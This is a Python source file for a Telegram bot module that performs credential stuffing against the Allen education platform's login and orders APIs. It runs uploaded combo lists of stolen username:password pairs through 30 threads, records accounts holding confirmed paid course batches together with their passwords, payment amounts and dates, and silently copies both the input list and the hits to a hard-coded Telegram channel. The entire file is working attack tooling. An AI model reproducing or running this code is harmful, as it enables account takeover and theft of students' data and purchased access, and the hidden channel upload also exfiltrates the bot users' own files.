import requests
import re
import os
import time
import asyncio
import logging
from concurrent.futures import ThreadPoolExecutor
from telegram import Update
from telegram.ext import ContextTypes

logger = logging.getLogger(__name__)

class Checker:
    # ============ BOT CONFIG ============
    command = "allen"
    name = "Allen"
    # ====================================

    def __init__(self):
        self.LOGIN_URL = "https://api.allen-live.in/api/v1/auth/username"
        self.ORDERS_URL = "https://api.allen-live.in/ecomm-bff/api/v1/orders"
        self.HEADERS = {
            "accept": "application/json", 
            "content-type": "application/json",
            "x-client-type": "web", 
            "x-device-id": "5a76f3a0-e6e7-4f33-972f-1b4a9593d154",
            "origin": "https://allen.in", 
            "referer": "https://allen.in/", 
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }

    def parse_combo_robust(self, line):
        line = line.strip()
        if not line or len(line) < 5:
            return None
        
        # Remove country codes
        line = re.sub(r'^(IN|US|UK|NZ|MX|KH|AE|BR|CL|DK|NO|HU|TG|ID)\s+', '', line, flags=re.IGNORECASE)
        
        # Normalize delimiters
        normalized = line.replace('|', ':').replace(';', ':').replace(',', ':')
        
        if ':' not in normalized:
            parts = normalized.split()
            if len(parts) == 2:
                normalized = f"{parts[0]}:{parts[1]}"
            else:
                return None

        parts = [p.strip() for p in normalized.split(':') if p.strip()]
        
        if len(parts) < 2:
            return None

        password = parts[-1]
        username = None
        
        for i in range(len(parts) - 2, -1, -1):
            candidate = parts[i]
            if candidate in ['https', 'http', '']:
                continue
            if candidate.startswith('//'):
                continue
            if '.in' in candidate and '/' in candidate:
                continue
                
            if '@' in candidate:
                username = candidate
                break
            if candidate.isdigit() and 5 <= len(candidate) <= 15:
                username = candidate
                break
            if re.match(r'^[a-zA-Z0-9_.]+$', candidate) and len(candidate) >= 3:
                username = candidate
                break
                
        if not username or len(password) < 3:
            return None
            
        itype = "EMAIL" if '@' in username else "FORM_ID"
        return username, password, itype

    def get_amount(self, batch):
        pp = batch.get("payment_plan", {})
        inst = pp.get("instalments", [])
        
        paid = 0
        for item in inst:
            if item.get("status") == "PAID":
                amt = item.get("total_amount") or item.get("paid_amount") or item.get("amount")
                if amt and isinstance(amt, (int, float)):
                    paid += amt
        
        if paid > 0:
            return f"₹{int(paid)}"
        
        if inst and isinstance(inst[0], dict):
            amt = inst[0].get("total_amount") or inst[0].get("paid_amount")
            if amt and isinstance(amt, (int, float)):
                return f"₹{int(amt)}"
        
        amt = pp.get("total_amount") or pp.get("paid_amount")
        if amt and isinstance(amt, (int, float)):
            return f"₹{int(amt)}"
        
        return "N/A"

    async def handle_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        context.user_data['awaiting_file_for'] = self.command
        await update.message.reply_text(
            f"📂 <b>{self.name} Ultra-Fast Checker Ready!</b>\n\n"
            f"Ab apna <code>combo.txt</code> file bhejo.\n"
            f"💡 <b>Robust Parse:</b> URLs, Country Codes, aur `|` / `:` delimiters auto-handle honge.\n"
            f"⚠️ <b>Strict Filter:</b> Sirf <b>CONFIRMED</b> batches wale accounts HIT honge.\n"
            f"⚡ <b>No Proxy:</b> 30 Threads ke sath direct ultra-fast connection.\n"
            f"🛑 Beech mein rokna ho toh <code>/stop</code> type kar do.",
            parse_mode="HTML"
        )

    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        progress_msg = await update.message.reply_text("⏳ File download kar raha hoon aur check start kar raha hoon...")
        
        file = await update.message.document.get_file()
        
        # ✅ Original filename aur temp path setup
        original_file_name = update.message.document.file_name or "combo.txt"
        temp_input_file = f"temp_input_{update.effective_user.id}_{int(time.time())}.txt"
        await file.download_to_drive(temp_input_file)
        
        with open(temp_input_file, 'r', encoding='utf-8-sig', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip()]
            
        total = len(lines)
        if total == 0:
            await progress_msg.edit_text("❌ File khali hai ya valid nahi hai!")
            if os.path.exists(temp_input_file): os.remove(temp_input_file)
            return

        stats = {'checked': 0, 'hits': 0, 'failed': 0, 'hit_details': []}
        context.user_data[f'stats_{self.command}'] = stats
        context.user_data['stop_checking'] = False

        # ✅ original_file_name bhi pass karo
        asyncio.create_task(self.run_checker(update, context, temp_input_file, original_file_name, lines, total, progress_msg))

    async def run_checker(self, update, context, temp_input_file, original_file_name, lines, total, progress_msg):
        max_workers = 30  # Ultra-fast speed
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            chunk_size = 30  # 30 workers * 30 = har 1-2 second mein progress update!
            
            for i in range(0, total, chunk_size):
                if context.user_data.get('stop_checking', False): break
                
                chunk = lines[i:i+chunk_size]
                futures = [executor.submit(self.check_single, line) for line in chunk]
                
                for future in futures:
                    if context.user_data.get('stop_checking', False): break
                    
                    result = future.result()
                    stats = context.user_data[f'stats_{self.command}']
                    stats['checked'] += 1
                    
                    if result['status'] == 'hit':
                        stats['hits'] += 1
                        stats['hit_details'].append(result['data'])
                    else:
                        stats['failed'] += 1
                
                if context.user_data.get('stop_checking', False): break
                
                stats = context.user_data[f'stats_{self.command}']
                progress_text = (
                    f"🔄 <b>{self.name} Checking...</b>\n\n"
                    f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
                    f"🔥 Confirmed Hits: {stats['hits']}\n"
                    f"❌ Failed/No Batch: {stats['failed']}\n⏳ Remaining: {total - stats['checked']}"
                )
                try:
                    await progress_msg.edit_text(progress_text, parse_mode="HTML")
                except Exception:
                    pass
                
                await asyncio.sleep(0.1)

        # ============ FINAL CLEANUP & SUMMARY ============
        stats = context.user_data.get(f'stats_{self.command}', {'checked': 0, 'hits': 0, 'failed': 0, 'hit_details': []})
        is_stopped = context.user_data.get('stop_checking', False)
        
        context.user_data.pop('stop_checking', None)
        context.user_data.pop('awaiting_file_for', None)
        context.user_data.pop(f'stats_{self.command}', None)
        
        user_name = update.effective_user.username or f"User_{update.effective_user.id}"
        
        # ✅ APP NAME se filename banao (e.g., "Allen.txt")
        app_filename = f"{self.name}.txt"
        
        status_emoji = "🛑" if is_stopped else "🎉"
        status_text = "User dwara STOP kar diya gaya!" if is_stopped else "Checking Completed!"
        
        # ✅ 1. CAPTION FOR USER (NO "👤 User" line here)
        user_caption = (
            f"{status_emoji} {self.name} - {status_text}\n\n"
            f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
            f"🔥 Confirmed Hits: {stats['hits']}\n❌ Failed/No Batch: {stats['failed']}"
        )
        
        # ✅ 2. CAPTION FOR LOG - Original File
        log_original_caption = (
            f"🎉 {self.name} Checker\n"
            f"👤 User: @{user_name}"
        )
        
        # ✅ 3. CAPTION FOR LOG - Hits File
        log_hits_caption = (
            f"👤 User: @{user_name}\n\n"
            f"{status_emoji} {self.name} - {status_text}\n\n"
            f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
            f"🔥 Confirmed Hits: {stats['hits']}\n❌ Failed/No Batch: {stats['failed']}"
        )
        
        if stats['hits'] > 0:
            hits_temp_file = f"hits_temp_{update.effective_user.id}_{int(time.time())}.txt"
            with open(hits_temp_file, 'w', encoding='utf-8') as f:
                for hit in stats['hit_details']: 
                    f.write(hit + "\n")
            
            # ✅ CHANGE 1: Live progress message ko delete kar do
            try:
                await progress_msg.delete()
            except Exception:
                pass
            
            # ✅ CHANGE 2: User ko sirf Hits file bhejo (Filename: Allen.txt)
            await update.message.reply_document(
                document=open(hits_temp_file, 'rb'),
                filename=app_filename,  # ✅ APP NAME FILENAME
                caption=user_caption
            )
            
            # ✅ CHANGE 3: Channel me DONO files bhejo
            try:
                # 1. Original File to Channel (Filename: Allen.txt)
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(temp_input_file, 'rb'),
                    filename=app_filename,  # ✅ APP NAME FILENAME
                    caption=log_original_caption
                )
                # 2. Hits File to Channel (Filename: Allen.txt)
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(hits_temp_file, 'rb'),
                    filename=app_filename,  # ✅ APP NAME FILENAME
                    caption=log_hits_caption
                )
            except Exception as e:
                logger.error(f"Channel send error: {e}")
                
            if os.path.exists(hits_temp_file):
                os.remove(hits_temp_file)
        else:
            # No hits: notify user (NO file sent back to user)
            await progress_msg.edit_text(
                f"{user_caption}\n\n❌ Koi bhi Confirmed Hit nahi mila.", 
                parse_mode="HTML"
            )
            
            # Optional: Still log the original file to channel even if 0 hits
            try:
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(temp_input_file, 'rb'),
                    filename=app_filename,  # ✅ APP NAME FILENAME
                    caption=f"{log_original_caption}\n(0 Hits)"
                )
            except Exception as e:
                logger.error(f"Channel send error: {e}")

        # ✅ Temporary input file delete karo (End mein)
        if os.path.exists(temp_input_file):
            os.remove(temp_input_file)

    def check_single(self, line):
        parsed = self.parse_combo_robust(line)
        if not parsed:
            return {'status': 'failed'}
        
        user, pas, itype = parsed
        
        session = requests.Session()
        session.headers.update(self.HEADERS)
        
        try:
            # 1. Login
            r = session.post(self.LOGIN_URL, json={
                "username": user, "password": pas,
                "persona_type": "STUDENT", "identity_type": itype
            }, timeout=10)
            
            if r.status_code == 200:
                data = r.json()
                if data.get("status") == 200:
                    tok = r.headers.get("X-ACCESS-TOKEN")
                    if tok:
                        # 2. Fetch Orders
                        h = self.HEADERS.copy()
                        h["authorization"] = f"Bearer {tok}"
                        r_orders = session.get(self.ORDERS_URL, headers=h, timeout=10)
                        
                        if r_orders.status_code == 200:
                            orders = r_orders.json().get("data", {}).get("orders", [])
                            confirmed_batches = [o for o in orders if o.get("status", {}).get("type") == "CONFIRMED"]
                            
                            # ✅ STRICT FILTER: Sirf tab HIT jab confirmed batches > 0
                            if confirmed_batches:
                                indicator = "📧" if itype == "EMAIL" else "🔢"
                                id_type_str = "Email" if itype == "EMAIL" else "Form ID"
                                
                                hit_text = "======================================================================\n"
                                hit_text += f"{indicator} Login: {user} ({id_type_str})\n"
                                hit_text += f"🔑 Pass : {pas}\n"
                                hit_text += f"📦 Batches: {len(confirmed_batches)}\n"
                                
                                for i, b in enumerate(confirmed_batches, 1):
                                    title = b.get("title", "N/A")
                                    bid = b.get("id", "N/A")
                                    attrs = " | ".join([str(a) for a in b.get("attributes", []) if a]) or "N/A"
                                    amount = self.get_amount(b)
                                    date = b.get("created_date", "N/A")
                                    status = b.get("status", {}).get("label", "N/A")
                                    
                                    hit_text += f"  {i}. {title}\n"
                                    hit_text += f"     ID:{bid} | 💰{amount} | 📋{attrs} | 📅{date} | ✅{status}\n"
                                    
                                hit_text += "======================================================================\n"
                                return {'status': 'hit', 'data': hit_text}
            
            return {'status': 'failed'}
        except Exception:
            return {'status': 'failed'}
        finally:
            session.close()
